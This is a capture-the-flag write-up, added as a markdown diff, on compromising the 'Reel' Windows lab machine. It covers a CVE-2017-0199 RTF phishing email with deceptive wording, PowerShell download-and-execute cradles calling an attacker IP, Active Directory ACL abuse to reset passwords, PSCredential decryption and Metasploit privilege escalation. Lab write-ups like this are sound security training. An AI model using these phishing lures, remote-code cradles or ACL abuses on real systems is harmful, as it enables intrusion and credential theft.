@@ -1,0 +1,366 @@
+### Summary
+- A **windows machine** with `Anonymous FTP` allowed. *Inspecting the contents* reveals a **documents folder** one of which tells us that *RTF documents are being reviewed and converted by someone*.
+- *Using this information,* we craft a *malicious document* using **CVE-2017-0199** and send it to a certain user called `nico` via the open `SMTP` port (*We find his username by checking the metadata of the documents on FTP*).
+- *When the document is opened,* we get a shell back as `nico` and start enumerating the machine.
+- *With BloodHound,* we find that nico has a `WriteOwner` right over another user `herman` who has a `WriteDACL` over a certain group called `Backup_Admins`.
+- We abuse the `WriteOwner` right to grant ourselves the right to reset `herman`'s password and abuse the `WriteDACL` to add him to the `Backup_Admins` group.
+- We then find out that `Backup_Admins` have access to a certain folder called `Backup Scripts` on the `Administrator`'s desktop on the box.
+- *Within that folder,* we find a script that contains the password for the local administrator which works and we use it to login using the open `SSH` port.
+- A *Similar path* exists with another user `tom` whom his credentials are present in a `creds.xml` file on `nico`'s desktop as a `secure string`.
+- The clear-text credentials can be retrieved to gain access as `tom` using `SSH`. `tom` has `WriteOwner` on `claire` who has a `WriteDACL` on `Backup_Admins`.
+- Another path exists with abusing the `SeLoadDriverPrivilege` held by `tom` since he's a member of the `Print Operators` group.
+- The box is also vulnerable to `CVE-2018-8440` and `CVE-2019-1458` local privilege escalation exploits.
+
+---
+
+### Nmap
+*Looking at the* `nmap` *scan,* we find very few ports running:
+```
+PORT   STATE SERVICE VERSION                                                                                      
+21/tcp open  ftp     Microsoft ftpd                                                                               
+| ftp-syst:                                                                                                       
+|_  SYST: Windows_NT                                                                                              
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                            
+|_05-29-18  12:19AM       <DIR>          documents                                                                
+22/tcp open  ssh     OpenSSH 7.6 (protocol 2.0)                                                                   
+| ssh-hostkey:                                                                                                    
+|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)            
+|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)           
+|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)         
+25/tcp open  smtp?                                                                                                
+| fingerprint-strings:                                                                                            
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
+|     220 Mail Service ready                                                                                      
+|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
+|     220 Mail Service ready                                                                                      
+|     sequence of commands                                                                                        
+|     sequence of commands                                                                                        
+|   Hello:                                                                                                        
+|     220 Mail Service ready                                                                                      
+|     EHLO Invalid domain address.                                                                                
+|   Help:                                                                                                         
+|     220 Mail Service ready                                                                                      
+|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY              
+|   SIPOptions:                                                                                                   
+|     220 Mail Service ready                                                                                      
+|     sequence of commands                                                                                        
+|     sequence of commands
+|     sequence of commands                              
+|     sequence of commands
+|     sequence of commands                                                                                        
+|     sequence of commands                                                                                        
+|     sequence of commands
+|     sequence of commands                    
+|     sequence of commands
+|     sequence of commands
+|     sequence of commands
+|   TerminalServerCookie: 
+|     220 Mail Service ready
+|_    sequence of commands
+| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+```
+
+### Anonymous FTP
+*Checking* **FTP**, we come across 3 files:
+- `Applocker.docx`
+- `readme.txt`
+- `Windows Event Forwarding.docx`
+
+![ftp-listing](/assets/Reel/ftp-listing.jpg)
+
+### Contents of readme.txt
+```
+please email me any rtf format procedures - I'll review and convert.
+
+new format / converted documents will be saved here.
+```
+
+### Looks like we're going phishing :D
+the content is about someone asking to be emailed RTF formats (a type of document) for him/her to review and convert.
+
+This seems like a **Phishing Challenge**. *In order to exploit,* we need to:
+1. Find out who that user is
+2. Find a way to create a malicious RTF file
+3. Find a way to send an email using the open SMTP port
+
+### Enumerating SMTP
+We use a tool called `smtp-user-enum` which lets us find if a given user exists or not.
+
+It uses a couple of **SMTP** commands to do that:
+1. VRFY
+2. EXPN
+3. RCPT
+
+we give it a list of male/female names from the **SecLists** Github Repo to try while we look at how to create a malicious document.
+
+![male-female-wordlists](/assets/Reel/male-female-wordlists.jpg)
+
+the command is:
+
+`smtp-user-enum -M VRFY -U users.txt -t 10.10.10.77`
+
+That takes a while to run. And it comes up short. *So we move on...*
+
+### Checking file metadata using `exiftool`
+
+When we run `exiftool` against the `Windows Event Forwarding.docx` file, we do find a user called `nico` whose email is `nico@megabank.com`
+
+![exiftool-wef-doc](/assets/Reel/exiftool-wef-doc.jpg)
+
+we note this down and go verify this user using `smtp-user-enum`
+
+### Trying various SMTP methods for enumeration
+
+*when testing mulitple methods with the* `nico` *user*, we still get no hits :/
+
+*However,* we do get a verification when add the `-D` flag and supply `megabank.com` as the domain.
+
+But only with the `RCPT` method:
+
+![nico-vrfy](/assets/Reel/nico-vrfy.jpg)
+
+![nico-expn](/assets/Reel/nico-expn.jpg)
+
+![nico-rcpt](/assets/Reel/nico-rcpt.jpg)
+
+### Working on the Phish
+
+Doing a **Google** search shows an article about **CVE-2017-0199** which looks promising.
+
+![rtf-exploit-search](/assets/Reel/rtf-exploit-search.jpg)
+
+*According to the article,* we should clone a repo (https://github.com/bhdresh/CVE-2017-0199.git) to get a **python** script.
+
+We look at the help:
+
+![cve-2017-0199-python](/assets/Reel/cve-2017-0199-python.jpg)
+
+We need to generate a malicious `RTF` document using the first mode `gen` and supply a url of an `HTA` file to achieve code execution.
+
+Let's first create the evil `HTA` file using `msfvenom`
+
+![evil-hta](/assets/Reel/evil-hta.jpg)
+
+And create the evil `RTF` and call it `review.rtf` to look benign
+
+![evil-rtf](/assets/Reel/evil-rtf.jpg)
+
+We host the payload on our kali machine using a standard `python3` webserver and start our listener with `nc -lvnp` on port 9000
+
+![hosted-payload](/assets/Reel/hosted-payload.jpg)
+
+What's left is to send the email to `nico@megabank.com`
+
+### Sending the mail and some deception ;)
+We're going to use the `sendEmail` command with a couple flags:
+- `-t <RECEPIENT>`
+- `-f <SENDER>`
+- `-s <SMTP_SERVER>`
+- `-u <MAIL_SUBJECT>`
+- `-a <PATH_TO_ATTACHMENT>`
+- `-m <MESSAGE_BODY>`
+
+Our command is:
+```
+sendEmail \
+-t nico@megabank.com \
+-f review@megabank.com \
+-s 10.10.10.77 \
+-u 'Document for Review' \
+-a /opt/CVE-2017-0199/review.rtf \
+-m 'Kindly review the attached document. Just press OK if you get an error while opening it and it should be fine.'
+```
+
+We try to look non-suspicous as possible. And use a subtle message in the body to have the user click 'OK' if he gets an error message (*which does happen with this exploit*).
+
+![document-error-1](/assets/Reel/document-error-1.jpg)
+
+![document-error-2](/assets/Reel/document-error-2.jpg)
+
+### Triggering the exploit chain
+*Having everything ready,* we trigger the chain:
+
+1. Send the malicious `RTF` file
+2. The `RTF` calls back to the `HTA` payload hosted on our kali machine
+3. The `HTA` file is executed and returns a shell on our listening host
+
+![exploit-chain](/assets/Reel/exploit-chain.jpg)
+
+### Brief note on the article content
+
+The guide talks about using an `exe` file. We cannot do so because of `Applocker`.
+
+We know this because it was mentioned that the user has set up `Hash Rules` for multiple file types:
+
+![Applocker-docx](/assets/Reel/Applocker-docx.jpg)
+
+This is why we generated an `HTA` payload using `msfvenom` instead.
+
+### Domain Enumeration using `SharpHound.ps1`
+
+*Since running* `.exe` *is disabled by* **Group Policy**, we turn to `BloodHound`'s **PowerShell ingestor** (https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1) and run the `Invoke-BloodHound` method.
+
+*But before we can do that,* we need a **PowerShell** shell.
+
+Switching to **PowerShell** from **CMD** can be done with the below command using the famous **Nishang shell** (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) adding the `Invoke-PowerShellTcp` call at the bottom of the `.ps1`
+
+`powershell "IEX(New-Object Net.webClient).downloadString('http://10.10.16.7:8000/nishang.ps1')"`
+
+*To run the* `Invoke-BloodHound` *method*, We import the `SharpHound.ps1` script into memory using the same we ran `Nishang.ps1`:
+
+`powershell "IEX(New-Object Net.webClient).downloadString('http://10.10.16.7:8000/SharpHound.ps1')"`
+
+### A note on `SharpHound.ps1` output:
+
+`Sharphound.ps1` will generate version 3 `JSON` files. Those *will not be compatible* with the most recent version of **BloodHound** (currently it's at 4).
+
+![sharphound-ps1-json-version](/assets/Reel/sharphound-ps1-json-version.jpg)
+
+*To get it working,* we will need to get `BloodHound` version 3 from the **Official Releases Page** (https://github.com/BloodHoundAD/BloodHound/releases/tag/3.0.3)
+
+### Investigating Possible Exploit Paths
+
+*Upon looking at* `BloodHound`'s *output,* we notice that `nico` can set the `owner` for user `herman`
+
+![nico-can-write-owner](/assets/Reel/nico-can-write-owner.jpg)
+
+*Simulating having owned the user* `herman`, we notice we can reach the `backup_admins` group.
+
+This is because the `herman` user has a `WriteDACL` right over it.
+
+![herman-has-write-dacl](/assets/Reel/herman-has-write-dacl.jpg)
+
+### Abusing `nico`'s `WriteOwner` right over `herman`
+
+*Checking the help for the* `WriteOwner` *right*, we notice we can use `PowerView`'s `Set-DomainObjectOwner` function.
+
+![set-dom-obj-owner](/assets/Reel/set-dom-obj-owner.jpg)
+
+**Command:** `Set-DomainObjectOwner -Identity herman -OwnerIdentity nico`
+
+We will need to follow up with `Add-DomainObjectAcl -TargetIdentity herman -PrincipalIdentity nico -Rights ResetPassword`
+
+![add-dom-object-acl](/assets/Reel/add-dom-object-acl.jpg)
+
+And set the password for `herman` using `Set-DomainUserPassword`
+
+![Set-dom-user-pwd](/assets/Reel/Set-dom-user-pwd.jpg)
+
+We create a `secure string` object using:
+
+`$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force`
+
+and set the password:
+
+`Set-DomainUserPassword -Identity herman -AccountPassword $UserPassword`
+
+### Logging in as herman and joining the `backup_admins` group
+
+*After resetting the password for* `herman`, we're able to login via the open `SSH` port:
+
+![ssh-as-herman](/assets/Reel/ssh-as-herman.jpg)
+
+and we can add ourselves to the `backup_admins` group easily with `Add-ADGroupMember 'backup_admins' -members herman`
+
+![joining-backup-admins](/assets/Reel/joining-backup-admins.jpg)
+
+### File System access with `backup_admins`'s group membership
+
+We first *relog* to *refresh our access* and check our newly-found acccess using `PowerShell`:
+
+```
+$ErrorActionPreference = 'silentlycontinue'
+ls -recurse -force | ? {$_.fullname -notmatch 'AppData|Application Data|Local Settings'} | ? {(get-acl $_.fullname ).accesstostring -like '*Backup_admins*'} | select -expand fullname
+$ErrorActionPreference = 'continue'
+```
+
+![file-access-as-backup-admins](/assets/Reel/file-access-as-backup-admins.jpg)
+
+The output suggests we should check out the files in the `Backup Scripts` folder.
+
+Checking the `BackupScript.ps1` shows a password:
+
+![backscript-password](/assets/Reel/backscript-password.jpg)
+
+Using the password `Cr4ckMeIfYouC4n!` works with the administrator user over `SSH`:
+
+![got-admin-path-1](/assets/Reel/got-admin-path-1.jpg)
+
+### Exploit Path #2: `nico` -> `tom` -> `claire` > `backup_admins`
+
+On `nico`'s desktop we find a file called `cred.xml`
+
+![nico-cred-xml](/assets/Reel/nico-cred-xml.jpg)
+
+*looking at its contents,* we recognize it's a **PowerShell Credential Object** that has the username and password of `tom`
+
+![ps-cred-object](/assets/Reel/ps-cred-object.jpg)
+
+A **PowerShell Credential Object** is used to execute commands *using a different set of creds* than that of the current user.
+
+*Without having the password,* we can import the credential object using `Import-Clixml` cmdlet and use it with the PowerShell `Start-Job` cmdlet to launch a `nishang` shell as `tom`
+
+![cred-to-tom](/assets/Reel/cred-to-tom.jpg)
+
+We can also retrieve the plain text password by using the `GetNetworkCredential` method of the `System.Management.Automation.PSCredential` class:
+
+![get-network-cred-method](/assets/Reel/get-network-cred-method.jpg)
+
+![toms-password](/assets/Reel/toms-password.jpg)
+
+The password works for `tom` using `SSH`
+
+![tom-ssh](/assets/Reel/tom-ssh.jpg)
+
+*Looking at the exploit path from* `tom` *using* `bloodhound`, shows the same path like `nico`
+
+![tom-owner-claire](/assets/Reel/tom-owner-claire.jpg)
+
+![claire-to-backup-admins](/assets/Reel/claire-to-backup-admins.jpg)
+
+### Exploit Path #3: Metasploitation
+
+The same exploit for **CVE-2017-0199** exists in a **Metasploit Module** (`windows/fileformat/office_word_hta`) when we search using the `rtf` keyword:
+
+![metasploit-rtf-exploit](/assets/Reel/metasploit-rtf-exploit.jpg)
+
+setting the options is **critical** here!
+
+We have to set the `SRVHOST` option or else it would create the document and embed our `eth0` IP address into the document (*Troubleshooting this part took me a while*).
+
+![setting-options-msf-exploit](/assets/Reel/setting-options-msf-exploit.jpg)
+
+We can send the `doc` file to the victim and he would still open it (*I didn't realise this at first and used a* `.DOC` *to* `.RTF` *converter*).
+
+![msf-doc](/assets/Reel/msf-doc.jpg)
+
+![got-meterpreter](/assets/Reel/got-meterpreter.jpg)
+
+We will then use `Metasploit`'s `local exploit suggester` *after migrating to a 64-bit process.*
+
+![x86-meterpreter](/assets/Reel/x86-meterpreter.jpg)
+
+![migrating-to-64-meterpreter](/assets/Reel/migrating-to-64-meterpreter.jpg)
+
+The module finds the host to be *vulnerable* to `CVE-2019-1458` also know as **Wizard Opium**.
+
+![msf-exp-suggester](/assets/Reel/msf-exp-suggester.jpg)
+
+which works like a charm XD
+
+![wizard-opium-works](/assets/Reel/wizard-opium-works.jpg)
+
+another exploit that worked is `CVE-2018-8440`
+
+![msf-alpc-privesc](/assets/Reel/msf-alpc-privesc.jpg)
+
+Of course these paths are not intended because it's just using `MetaSploit`
+
+### Exploit Path #4 (Incomplete): Abusing `SeLoadDriverPrivilege`
+
+The `tom` user is a member of the `Print Operators` Group which hold the `SeLoadDriverPrivilege`
+
+![print-ops-and-load-driver](/assets/Reel/print-ops-and-load-driver.jpg)
+
+*However,* exploiting this would be challenging to achieve specially with the **Group Policy** restrictions in place.
